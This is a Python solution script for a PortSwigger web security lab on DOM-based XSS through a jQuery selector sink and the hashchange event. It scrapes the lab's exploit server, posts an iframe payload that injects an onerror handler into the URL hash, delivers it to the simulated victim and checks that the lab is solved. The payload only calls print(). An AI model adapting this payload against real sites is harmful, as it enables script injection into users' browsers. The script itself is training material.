#!/usr/bin/env python3
# Lab: DOM XSS in jQuery selector sink using a hashchange event
# Lab-Link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    return result


def exploit(client, exploit_server, lab_server):
    data = {'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': '''HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8''',
            'responseBody': '''<iframe src="''' + lab_server + '''/#" onload="this.src+='<img src=xxx onerror=print()>'"></iframe>''',
            'formAction': 'DELIVER_TO_VICTIM'}

    return client.post(exploit_server, data=data).status_code == 200


def main():
    print('[+] Lab: DOM XSS in jQuery selector sink using a hashchange event')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    exploit_server = find_exploitserver(client.get(host).text)
    print(f'[+] Exploit server: {exploit_server}')

    if not exploit(client, exploit_server, host):
        print(f'[-] Failed to deliver exploit to victim')
        sys.exit(-3)
    print(f'[+] Delivered exploit to victim')

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
